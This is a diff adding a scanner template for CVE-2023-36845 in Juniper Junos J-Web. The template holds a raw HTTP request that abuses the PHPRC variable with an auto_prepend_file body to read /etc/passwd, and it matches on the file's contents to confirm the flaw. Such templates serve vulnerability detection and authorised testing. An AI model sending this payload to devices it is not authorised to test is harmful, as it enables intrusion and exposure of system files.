@@ -1,0 +1,28 @@
+id: junos-webauth-operation-php-phprc-rce
+info:
+  name: Junos webauth_operation.php PHPRC Remote Code Execution (CVE-2023-36845)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,CVE-2023-36845
+http:
+  - raw:
+      - |
+        GET /?PHPRC=/dev/fd/0 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        auto_prepend_file="/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "Log In - Juniper Web Device Manager"
+        part: header
